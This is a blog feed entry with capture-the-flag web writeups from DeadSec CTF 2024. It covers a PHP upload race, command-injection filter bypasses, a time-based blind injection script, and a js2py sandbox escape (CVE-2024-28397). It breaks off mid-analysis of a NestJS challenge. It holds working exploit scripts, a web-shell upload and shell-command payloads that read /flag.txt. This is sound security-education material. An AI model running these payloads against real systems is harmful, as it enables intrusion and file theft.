<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://0.0.0.0:8000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:8000/" rel="alternate" type="text/html" /><updated>2024-07-28T22:28:04+03:00</updated><id>http://0.0.0.0:8000/feed.xml</id><title type="html">0xOZ</title><subtitle>Security Researcher notes</subtitle><author><name>Ahmad Abuzaid</name><email>iiahmad435@gmail.com</email></author><entry><title type="html">DeadSec CTF 2024 Web Writeups</title><link href="http://0.0.0.0:8000/writeups/deadsec-ctf-2024" rel="alternate" type="text/html" title="DeadSec CTF 2024 Web Writeups" /><published>2024-07-28T00:00:00+03:00</published><updated>2024-07-28T00:00:00+03:00</updated><id>http://0.0.0.0:8000/writeups/deadsec-ctf-2024</id><content type="html" xml:base="http://0.0.0.0:8000/writeups/deadsec-ctf-2024"><![CDATA[<p>This is a collection of writeups for the Web challenges of DeadSec CTF 2024. The CTF was held by the <a href="https://deadsec.ctf.ae/">DeadSec</a> team. The CTF was held on 28th July 2024. My team scored place 48/619 with 1081 points.</p>

<h1 id="web">Web</h1>

<h2 id="ezstart">EzStart</h2>

<ul>
  <li>Difficulty: Easy</li>
</ul>

<p><img src="/assets/images/deadsec-writeups/ezstart.png" alt="EzStart" /></p>

<p>I started analyzing the provided source code, there is only one interesting file for us to discuss, the <code class="language-plaintext highlighter-rouge">src/upload.php</code></p>

<p><img src="/assets/images/deadsec-writeups/ezstart-01.png" alt="EzStart-Code" /></p>

<p>In the code, we can see that we can upload any kind of file regarding the written filters because they were pointless (no prevention after the checks). Still, the notable thing is that anything we upload is going to be deleted at the end through <code class="language-plaintext highlighter-rouge">unlink()</code>, moreover, if we upload a file with <code class="language-plaintext highlighter-rouge">&lt; 10MB</code> size it will be moved from PHP’s uploads tmp folder to accessible <code class="language-plaintext highlighter-rouge">/var/www/html/tmp</code> folder then will be removed at the end.</p>

<p>For the upload filename, we can’t specify anything existent to overwrite or cause deletion like the index.html or anything, we can’t also do path traversal because the basename and the ext were only taken from the filename</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="nv">$uploadpath</span> <span class="o">=</span> <span class="s2">"tmp/"</span><span class="p">;</span>
    <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"files"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">],</span> <span class="no">PATHINFO_EXTENSION</span><span class="p">);</span>
    <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"files"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">],</span> <span class="s2">"."</span> <span class="mf">.</span> <span class="nv">$ext</span><span class="p">);</span>
    <span class="nv">$timestamp</span> <span class="o">=</span> <span class="nb">time</span><span class="p">();</span>
    <span class="nv">$new_name</span> <span class="o">=</span> <span class="nv">$filename</span> <span class="mf">.</span> <span class="s1">'_'</span> <span class="mf">.</span> <span class="nv">$timestamp</span> <span class="mf">.</span> <span class="s1">'.'</span> <span class="mf">.</span> <span class="nv">$ext</span><span class="p">;</span>
    <span class="nv">$upload_dir</span> <span class="o">=</span> <span class="nv">$uploadpath</span> <span class="mf">.</span> <span class="nv">$new_name</span><span class="p">;</span>
</code></pre></div></div>

<p>Clearly, we can’t do anything but a race condition, the only issue is the <code class="language-plaintext highlighter-rouge">$timestamp</code> that we can’t exactly predict but can be brute-forced.</p>

<p>We need to upload a PHP file that will read the <code class="language-plaintext highlighter-rouge">/flag.txt</code> (which we know about its location from the Dockerfile) and simultaneously try to access that file.</p>

<p>I created the following script which will do all the work</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">threading</span>
<span class="kn">import</span> <span class="n">datetime</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">re</span>


<span class="c1"># url = f"http://127.0.0.1/"
</span><span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://da93b7e95bdffb4bb4d946e2.deadsec.quest/</span><span class="sh">"</span>
<span class="n">max_threads</span> <span class="o">=</span> <span class="mi">50</span>  <span class="c1"># Set the maximum number of threads
</span>
<span class="k">def</span> <span class="nf">access_payload</span><span class="p">(</span><span class="n">timestamp</span><span class="p">):</span>
    <span class="n">file_name</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">shell_</span><span class="si">{</span><span class="nf">int</span><span class="p">(</span><span class="n">timestamp</span><span class="p">)</span><span class="si">}</span><span class="s">.php</span><span class="sh">"</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">tmp/</span><span class="sh">"</span> <span class="o">+</span> <span class="n">file_name</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span>
    <span class="k">if</span> <span class="sh">"</span><span class="s">The requested URL was not found on this server</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sa">r</span><span class="sh">"</span><span class="s">DEAD{.*}</span><span class="sh">"</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Killing Task...</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">kill</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="nf">getpid</span><span class="p">(),</span> <span class="mi">9</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">flag</span>

    <span class="k">return</span> <span class="n">flag</span>


<span class="k">def</span> <span class="nf">upload_payload</span><span class="p">():</span>
    <span class="n">file_content</span> <span class="o">=</span> <span class="sh">"""</span><span class="s">
    &lt;?php
    system(</span><span class="sh">"</span><span class="s">cat /f*</span><span class="sh">"</span><span class="s">);
    ?&gt;
    </span><span class="sh">"""</span>
    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">files</span><span class="sh">"</span><span class="p">:</span> <span class="p">(</span><span class="sh">"</span><span class="s">shell.php</span><span class="sh">"</span><span class="p">,</span> <span class="n">file_content</span><span class="p">,</span> <span class="sh">"</span><span class="s">application/octet-stream</span><span class="sh">"</span><span class="p">)}</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">upload.php</span><span class="sh">"</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Using Max Threads of </span><span class="sh">"</span><span class="p">,</span> <span class="n">max_threads</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">65535</span><span class="p">):</span>
        <span class="n">current_timestamp</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="nf">now</span><span class="p">().</span><span class="nf">timestamp</span><span class="p">())</span>
        <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">access_payload</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">current_timestamp</span><span class="p">,))</span>
        <span class="n">t2</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">upload_payload</span><span class="p">)</span>

        <span class="n">t</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
        <span class="n">t2</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">threading</span><span class="p">.</span><span class="nf">active_count</span><span class="p">()</span> <span class="o">&gt;</span> <span class="n">max_threads</span><span class="p">:</span>
            <span class="n">t</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
            <span class="n">t2</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Max Threads Reached</span><span class="sh">"</span><span class="p">)</span>
            
</code></pre></div></div>

<p>And got the flag in no time 🙂</p>

<p><img src="/assets/images/deadsec-writeups/ezstart-02.png" alt="EzStart-PoC" /></p>

<h2 id="bing2">Bing2</h2>

<ul>
  <li>Difficulty: Easy</li>
</ul>

<p><img src="/assets/images/deadsec-writeups/bing2.png" alt="Bing2" /></p>

<p>This one is a command injection in the <code class="language-plaintext highlighter-rouge">bing.php</code> <code class="language-plaintext highlighter-rouge">host</code> parameter, it pings the host we provide and we can inject commands there. The trick here is to bypass the filters and read the flag <code class="language-plaintext highlighter-rouge">/flag.txt</code> which one of the filters is to <em>delete</em> the keyword <code class="language-plaintext highlighter-rouge">cat</code> and <code class="language-plaintext highlighter-rouge">flag</code> from many others in the input.</p>

<p><img src="/assets/images/deadsec-writeups/bing2-01.png" alt="Bing2" /></p>

<p>Because it <em>removes</em> the keywords we can use that to generate our keywords like this:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Bing2 curl <span class="nt">-XPOST</span> https://d931e8d7082cacac0d2a37f7.deadsec.quest/bing.php <span class="nt">-d</span> <span class="s2">"Submit"</span> <span class="nt">-d</span> <span class="s1">'ip=;id;cacatt${IFS}/f*'</span>
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
DEAD<span class="o">{</span>5b814948-3153-4dd5-a3ac-bc1ec706d766<span class="o">}</span>
</code></pre></div></div>

<p>I also used <code class="language-plaintext highlighter-rouge">${IFS}</code> as a space because spaces are blacklisted too</p>

<h2 id="bing_revenge">Bing_Revenge</h2>

<ul>
  <li>Difficulty: Easy</li>
</ul>

<p><img src="/assets/images/deadsec-writeups/bing_revenge.png" alt="Bing_Revenge" /></p>

<p>This one takes different approach than the previous, it’s a python application that will execute the command we provide in the <code class="language-plaintext highlighter-rouge">host</code> parameter, the trick here is nothing printed what so ever in the response, so we need to find a way to read the flag <code class="language-plaintext highlighter-rouge">/flag.txt</code> without seeing the output. Unfortunately, we can’t have out of band access to the server because of the firewall.</p>

<p><img src="/assets/images/deadsec-writeups/bing_revenge-01.png" alt="Bing_Revenge" /></p>

<p>In this case we can take the same approach used for time-based SQL injections, we will be reading the flags chars and comparing them, whenever our guess is correct we will sleep for few seconds (I used 7 because the server was slow).</p>

<p>The pseudo code will look like this:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">;if [ $(cat /flag.txt | cut -c</span><span class="si">{</span><span class="n">c_i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s"> | grep -c </span><span class="sh">'</span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="sh">'</span><span class="s">) -eq 1 ]; then sleep </span><span class="si">{</span><span class="nf">str</span><span class="p">(</span><span class="n">sleep_time</span><span class="p">)</span><span class="si">}</span><span class="s">; fi</span><span class="sh">"</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">host</span><span class="sh">"</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">elapsed</span><span class="p">.</span><span class="nf">total_seconds</span><span class="p">()</span> <span class="o">&gt;</span> <span class="n">sleep_time</span><span class="p">:</span>
    <span class="c1"># we guessed the char correctly
</span></code></pre></div></div>

<p>Automating this with python is great and would work fine locally, but the server was slow and there might be many errors to catch through the way, so I used BurpSuite Intruder during the ctf where I sent all the possible chars for each char address <code class="language-plaintext highlighter-rouge">-c ..</code>, checked the response time that are &gt; 7 seconds and grabbed the flag manually.</p>

<p>But here is the python script that I used locally:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/bin/python3
</span><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">from</span> <span class="n">string</span> <span class="kn">import</span> <span class="n">printable</span>

<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://127.0.0.1:5000/flag</span><span class="sh">"</span>
<span class="n">flag</span> <span class="o">=</span> <span class="sh">"</span><span class="s">DEAD{</span><span class="sh">"</span>
<span class="n">sleep_time</span> <span class="o">=</span> <span class="mi">1</span>

<span class="n">chars</span> <span class="o">=</span> <span class="n">printable</span>
<span class="c1"># those always return true in the search
</span><span class="n">chars</span> <span class="o">=</span> <span class="p">(</span>
    <span class="n">chars</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">.</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">$</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">^</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">)</span>
<span class="p">)</span>  <span class="c1"># mostly the flag charset is a-zA-Z0-9{}_-
</span>

<span class="k">def</span> <span class="nf">request</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">host</span><span class="sh">"</span><span class="p">:</span> <span class="n">payload</span><span class="p">}</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="nb">ConnectionError</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">request</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span> <span class="ow">or</span> <span class="sh">"</span><span class="s">Error</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">request</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">r</span><span class="p">.</span><span class="n">elapsed</span><span class="p">.</span><span class="nf">total_seconds</span><span class="p">()</span>


<span class="n">c_i</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">;if [ $(cat /flag.txt | cut -c</span><span class="si">{</span><span class="n">c_i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s"> | grep -c </span><span class="sh">'</span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="sh">'</span><span class="s">) -eq 1 ]; then sleep </span><span class="si">{</span><span class="nf">str</span><span class="p">(</span><span class="n">sleep_time</span><span class="p">)</span><span class="si">}</span><span class="s">; fi</span><span class="sh">"</span>  <span class="c1"># this way it is possible to implement threading, but it will overload the server so I didn't try it.
</span>        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Tyring </span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="sh">"</span><span class="se">\r</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">r</span> <span class="o">=</span> <span class="nf">request</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="k">while</span> <span class="n">sleep_time</span> <span class="o">&gt;</span> <span class="n">r</span> <span class="o">+</span> <span class="mi">4</span><span class="p">:</span>  <span class="c1"># to handle possible falst posatives
</span>            <span class="n">r</span> <span class="o">=</span> <span class="nf">request</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">r</span> <span class="o">&gt;=</span> <span class="n">sleep_time</span> <span class="ow">and</span> <span class="n">r</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">()</span>
            <span class="n">flag</span> <span class="o">+=</span> <span class="n">c</span>
            <span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
            <span class="nf">print</span><span class="p">()</span>
            <span class="k">break</span>
    <span class="k">if</span> <span class="n">flag</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">}</span><span class="sh">"</span><span class="p">:</span>
        <span class="k">break</span>

    <span class="n">c_i</span> <span class="o">+=</span> <span class="mi">1</span>


<span class="nf">print</span><span class="p">()</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Done</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="retro-calculator">Retro-calculator</h2>

<ul>
  <li>Difficulty: Hard</li>
</ul>

<p><img src="/assets/images/deadsec-writeups/retro-calculator.png" alt="Retro-calculator" /></p>

<p>This one was a fun challenge, it’s a simple calc the trick here is that the calculator is written js2py which is a python library that can execute javascript code.</p>

<p>First there wasn’t any source code, so I started analyzing and fuzzing arround to see what’s running under the hood, when I tried to use `` to execute commands I got the following error:</p>

<p><img src="/assets/images/deadsec-writeups/retro-calculator-01.png" alt="Retro-calculator" /></p>

<p>First I thought it’s totally JS backend but after searching for the error I found that it’s js2py from <a href="https://stackoverflow.com/questions/64855107/how-to-render-ecmascript-6-with-python">here</a></p>

<p>I didn’t want to start fuzzing what works and what doesn’t or whether there was any WAFs, I started looking for any possible CVEs and found unresolved one <a href="https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape">CVE-2024-28397</a>. I copied the <code class="language-plaintext highlighter-rouge">poc.py</code> payload and tried to execute, there where I started to dive into the endless “Hacking Attempts” rabbit hole.</p>

<p><img src="/assets/images/deadsec-writeups/retro-calculator-02.png" alt="Retro-calculator" /></p>

<p>I am sure this is the worst way to go, but I kept playing around with the payload until it actually just worked (+1 for trying harder approach).</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">cmd</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">ls /; cat /flag.txt; </span><span class="dl">'</span><span class="p">;</span> <span class="nx">cmd</span><span class="p">;</span><span class="kd">let</span> <span class="nx">hacked</span><span class="p">,</span> <span class="nx">bymarve</span><span class="p">,</span> <span class="nx">n11</span><span class="p">;</span><span class="kd">let</span> <span class="nx">getattr</span><span class="p">,</span> <span class="nx">obj</span><span class="p">;</span><span class="nx">hacked</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">getOwnPropertyNames</span><span class="p">({});</span><span class="nx">bymarve</span> <span class="o">=</span> <span class="nx">hacked</span><span class="p">.</span><span class="nx">__getattribute__</span><span class="p">;</span><span class="nx">n11</span> <span class="o">=</span> <span class="nf">bymarve</span><span class="p">(</span><span class="dl">'</span><span class="s1">__getattribute__</span><span class="dl">'</span><span class="p">);</span><span class="nx">obj</span> <span class="o">=</span> <span class="nf">n11</span><span class="p">(</span><span class="dl">'</span><span class="s1">__class__</span><span class="dl">'</span><span class="p">).</span><span class="nx">__base__</span><span class="p">;</span><span class="nx">getattr</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">__getattribute__</span><span class="p">;</span><span class="kd">function</span> <span class="nf">findpopen</span><span class="p">(</span><span class="nx">o</span><span class="p">)</span> <span class="p">{</span><span class="kd">let</span> <span class="nx">result</span><span class="p">;</span> <span class="kd">let</span> <span class="nx">zed</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">__sub</span><span class="dl">'</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">classes__</span><span class="dl">'</span><span class="p">;</span><span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="k">in</span>  <span class="nx">o</span><span class="p">[</span><span class="nx">zed</span><span class="p">]()){</span> <span class="kd">let</span> <span class="nx">item</span> <span class="o">=</span> <span class="nx">o</span><span class="p">[</span><span class="nx">zed</span><span class="p">]()[</span><span class="nx">i</span><span class="p">];</span><span class="kd">let</span> <span class="nx">nm</span><span class="o">=</span><span class="dl">'</span><span class="s1">__name__</span><span class="dl">'</span><span class="p">;</span> <span class="kd">let</span> <span class="nx">sb</span><span class="o">=</span><span class="dl">'</span><span class="s1">subp</span><span class="dl">'</span><span class="o">+</span><span class="dl">'</span><span class="s1">roces</span><span class="dl">'</span><span class="p">;</span><span class="k">if </span><span class="p">(</span><span class="nx">item</span><span class="p">.</span><span class="nx">__module__</span> <span class="o">==</span> <span class="nx">sb</span><span class="o">+</span><span class="dl">'</span><span class="s1">s</span><span class="dl">'</span> <span class="o">&amp;&amp;</span><span class="nx">item</span><span class="p">.</span><span class="nx">__name__</span><span class="o">==</span><span class="dl">'</span><span class="s1">P</span><span class="dl">'</span><span class="o">+</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">){</span><span class="k">return</span> <span class="nx">item</span><span class="p">}</span><span class="k">if</span><span class="p">(</span><span class="nx">item</span><span class="p">.</span><span class="nx">__name__</span><span class="o">!=</span><span class="dl">'</span><span class="s1">type</span><span class="dl">'</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nx">result</span><span class="o">=</span><span class="nf">findpopen</span><span class="p">(</span><span class="nx">item</span><span class="p">))){</span> <span class="k">return</span> <span class="nx">result</span> <span class="p">}</span> <span class="p">}};</span><span class="nx">n11</span> <span class="o">=</span> <span class="nf">findpopen</span><span class="p">(</span><span class="nx">obj</span><span class="p">)(</span><span class="nx">cmd</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">true</span><span class="p">).</span><span class="nf">communicate</span><span class="p">()</span>
</code></pre></div></div>

<p>That was weird but fun!</p>

<h2 id="colorful-board">Colorful Board</h2>

<ul>
  <li>Difficulty: Medium</li>
</ul>

<p><img src="/assets/images/deadsec-writeups/colorful-board.png" alt="Colorful Board" /></p>

<p>We are finally there, I liked this challenge so much and was so exicted to make a writeup for it.
This challenge is <em>another</em> source analysis, we have a nestjs application with mongodb (exicting right?) I will analyze and discuss the interesting parts of the code and the controls that we have briefly to you later understand how I crafted the exploit or how I thought about it.</p>

<p>We have four controllersas follow:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">auth.controller.ts</code> which is responsible for the authentication and the login and registeration, it has the following endpoints:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">GET/POST /auth/register</code></li>
      <li><code class="language-plaintext highlighter-rouge">GET/POST /auth/login</code></li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">post.controller.ts</code> which is responsible for the posts management, view/edit/write, it has the following endpoints:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">GET /post</code></li>
      <li><code class="language-plaintext highlighter-rouge">GET /post/all</code></li>
      <li><code class="language-plaintext highlighter-rouge">GET/POST /post/write</code></li>
      <li><code class="language-plaintext highlighter-rouge">GET/POST /post/edit/:id</code> - Only Admin</li>
      <li><code class="language-plaintext highlighter-rouge">GET/POST /post/:id</code></li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">admin.controller.ts</code> which is responsible for the admin functions, it has the following endpoints:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">GET /admin/grant?username</code> Only localhost access</li>
      <li><code class="language-plaintext highlighter-rouge">GET /admin/notice</code> Only Admin</li>
      <li><code class="language-plaintext highlighter-rouge">GET /admin/report</code> - Anyone logged in (doesn’t have to be admin)</li>
      <li><code class="language-plaintext highlighter-rouge">GET /admin/notice/:id</code> - Only Admin</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">user.controller.ts</code> which is responsible for the user profile and the user data, it has no endpoints just utilities used across the app</li>
</ul>

<p>Those are the endpoints with functionalities, we will dive in details in what we needs when times come.</p>

<p>Now before we start diving into exploiting it, we need to answer few questions, where is the flag? what else is running in the application?</p>

<p>Looking at the sources files we have <code class="language-plaintext highlighter-rouge">init-data.js</code></p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// ...</span>
<span class="kd">const</span> <span class="nx">init_db</span> <span class="o">=</span> <span class="k">async </span><span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">users</span><span class="p">.</span><span class="nf">insertMany</span><span class="p">([</span>
        <span class="p">{</span> <span class="na">username</span><span class="p">:</span> <span class="dl">"</span><span class="s2">DEAD{THIS_IS_</span><span class="dl">"</span><span class="p">,</span> <span class="na">password</span><span class="p">:</span> <span class="dl">"</span><span class="s2">dummy</span><span class="dl">"</span><span class="p">,</span> <span class="na">personalColor</span><span class="p">:</span> <span class="dl">"</span><span class="s2">#000000</span><span class="dl">"</span><span class="p">,</span> <span class="na">isAdmin</span><span class="p">:</span> <span class="kc">true</span> <span class="p">},</span>
    <span class="p">]);</span>
    <span class="k">await</span> <span class="nf">delay</span><span class="p">(</span><span class="nf">randomDelay</span><span class="p">());</span>
    <span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">notices</span><span class="p">.</span><span class="nf">insertOne</span><span class="p">({</span> <span class="na">title</span><span class="p">:</span> <span class="dl">"</span><span class="s2">asdf</span><span class="dl">"</span><span class="p">,</span> <span class="na">content</span><span class="p">:</span> <span class="dl">"</span><span class="s2">asdf</span><span class="dl">"</span> <span class="p">});</span>
    <span class="k">await</span> <span class="nf">delay</span><span class="p">(</span><span class="nf">randomDelay</span><span class="p">());</span>
    <span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">notices</span><span class="p">.</span><span class="nf">insertOne</span><span class="p">({</span> <span class="na">title</span><span class="p">:</span> <span class="dl">"</span><span class="s2">flag</span><span class="dl">"</span><span class="p">,</span> <span class="na">content</span><span class="p">:</span> <span class="dl">"</span><span class="s2">FAKE_FLAG}</span><span class="dl">"</span> <span class="p">});</span>
    <span class="k">await</span> <span class="nf">delay</span><span class="p">(</span><span class="nf">randomDelay</span><span class="p">());</span>
    <span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">notices</span><span class="p">.</span><span class="nf">insertOne</span><span class="p">({</span> <span class="na">title</span><span class="p">:</span> <span class="dl">"</span><span class="s2">qwer</span><span class="dl">"</span><span class="p">,</span> <span class="na">content</span><span class="p">:</span> <span class="dl">"</span><span class="s2">qwer</span><span class="dl">"</span> <span class="p">});</span>
<span class="p">}</span>
<span class="nf">init_db</span><span class="p">();</span>
<span class="c1">// ..</span>
</code></pre></div></div>

<p>Interesting, part of the flag is part of the admin’s username and the other part is part of the notices, moreover there is no way in the application to expose someone’s username if he didn’t post anything, and for the second part we need to know the notice id to access it, because the <code class="language-plaintext highlighter-rouge">GET /admin/notice/</code> doesn’t show the Notice ID if it includes “flag” in the title, Finally we need to be an admin to access the notices.</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">@</span><span class="nd">Get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/notice</span><span class="dl">'</span><span class="p">)</span>
    <span class="p">@</span><span class="nd">UseGuards</span><span class="p">(</span><span class="nx">AdminGuard</span><span class="p">)</span> <span class="c1">// Only Admin</span>
    <span class="p">@</span><span class="nd">Render</span><span class="p">(</span><span class="dl">'</span><span class="s1">notice-main</span><span class="dl">'</span><span class="p">)</span>
